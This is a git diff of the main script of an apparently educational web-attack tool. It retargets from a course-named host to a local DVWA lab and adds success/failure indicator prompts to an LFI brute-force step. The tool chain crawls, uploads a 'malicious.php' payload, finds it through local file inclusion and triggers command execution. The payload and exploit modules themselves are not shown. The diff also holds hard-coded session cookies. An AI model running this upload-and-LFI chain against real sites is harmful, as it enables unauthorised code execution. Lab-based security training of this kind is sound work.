@@ -8,14 +8,14 @@ import lfi
 import uploadv2
 
 # Fictional Company
-URL = "http://ict2214p1b2.mooo.com/"
-COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
-PAYLOAD_FILENAME = "test.php"
+# URL = "http://ict2214p1b2.mooo.com/"
+# COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
+# PAYLOAD_FILENAME = "test.php"
 
 # DVWA
-# URL = "http://127.0.0.1/DVWA/"
-# COOKIE = {"PHPSESSID": "592650b8ta6dts0u0orun6jj25", "security": "medium"}
-# PAYLOAD_FILENAME = "malicious.php"
+URL = "http://127.0.0.1/DVWA/"
+COOKIE = {"PHPSESSID": "592650b8ta6dts0u0orun6jj25", "security": "medium"}
+PAYLOAD_FILENAME = "malicious.php"
 
 # UPLOAD_DIR = f"{URL}hackable/uploads/"
 UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
@@ -42,6 +42,13 @@ def generate_report(uploaded_url, lfi_url, command_results):
 def main():
     session = requests.Session()
 
+    success_indicator = input(
+        "Enter the success indicator (e.g., text that appears on success): "
+    )
+    failure_indicator = input(
+        "Enter the failure indicator (e.g., text that indicates failure): "
+    )
+
     # Main function
     found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
     print("Crawling complete.")
@@ -67,7 +74,7 @@ def main():
 
     # Generate the payloads
     # payload_filenames = uploadv2.create_payloads()
-    
+
     # Use dynamic wordlists to determine endpoints:
     # dynamic_upload_url = uploadv2.try_upload_url(args.url, args.upload_url_wordlist, COOKIE, PAYLOAD_FILENAME)
     # if dynamic_upload_url is None:
@@ -96,10 +103,10 @@ def main():
     lfi_found_url = None
     for target in lfi_confirmed_targets:
         print("Brute forcing LFI now")
-        lfi_found_url = lfi.brute_force_lfi(target, PAYLOAD_FILENAME, session, COOKIE)
+        lfi_found_url = lfi.brute_force_lfi(target, PAYLOAD_FILENAME, success_indicator, failure_indicator, session, COOKIE)
         if lfi_found_url:
             break
-    
+
     # Need to add for LFI
     # --- Trigger Payload Phase ---
     if lfi_found_url:
@@ -107,7 +114,7 @@ def main():
     else:
         print("[-] Could not locate the uploaded file via LFI.")
         command_results = ""
-        
+
     # # --- Report Generation ---
     # generate_report(direct_file_url, lfi_found_url, command_results)
 
